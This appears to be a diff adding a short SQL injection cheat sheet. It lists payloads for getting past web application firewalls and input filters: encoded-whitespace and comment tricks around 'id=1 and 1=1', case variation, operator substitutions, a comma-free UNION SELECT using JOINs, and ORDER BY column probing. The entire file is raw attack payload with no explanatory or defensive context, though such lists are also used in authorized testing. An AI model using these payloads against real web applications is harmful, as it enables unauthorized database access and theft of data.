@@ -1,0 +1,22 @@
+?id=1%09and%091=1%09--
+?id=1%0Dand%0D1=1%0D--
+?id=1%0Cand%0C1=1%0C--
+?id=1%0Band%0B1=1%0B--
+?id=1%0Aand%0A1=1%0A--
+?id=1%A0and%A01=1%A0--
+?id=1/*comment*/and/**/1=1/**/--
+?id=(1)and(1)=(1)--
+LIMIT 0,1 -> LIMIT 1 OFFSET 0
+SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
+SELECT 1,2,3,4 -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN
+(SELECT 3)c JOIN (SELECT 4)d
+?id=1 AND 1=1#
+?id=1 AnD 1=1#
+?id=1 aNd 1=1# AND -> &&
+OR -> ||
+= -> LIKE,REGEXP, not < and not >
+> X -> not between 0 and X
+WHERE -> HAVING
+order by 1
+order by 2
+order by 3
